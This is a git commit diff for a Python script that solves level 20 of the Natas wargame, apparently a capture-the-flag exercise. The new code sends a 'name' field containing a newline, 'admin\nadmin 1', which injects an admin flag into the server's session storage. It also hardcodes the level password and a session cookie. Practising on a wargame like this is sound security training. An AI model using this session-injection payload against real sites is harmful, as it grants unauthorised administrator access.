d6a4bcb6f11db95c8189b27af69b6d24ff8b2677
Alexander Zwisler <alexander@zwisler.dev>
2022-07-09 20:16:43 +0200

    Natas 20

--- natas20.py
+++ natas20.py
@@ -2,6 +2,7 @@ import natasX
 
 natas = natasX
 
-for i in range(10):
-    print(natas.natasX(20, "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF", endpoint="index.php",
-                       data={"debug": "", "username": "o9u326p5pt2min81hltemmgdi7"}).text)
+print(natas.natasX(20, "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF",
+                   endpoint="index.php",
+                   data={"debug": "", "name": "admin\nadmin 1"},
+                   cookies={"PHPSESSID": "q8k4kl3ar05rkga90rtib0ros1"}).text)
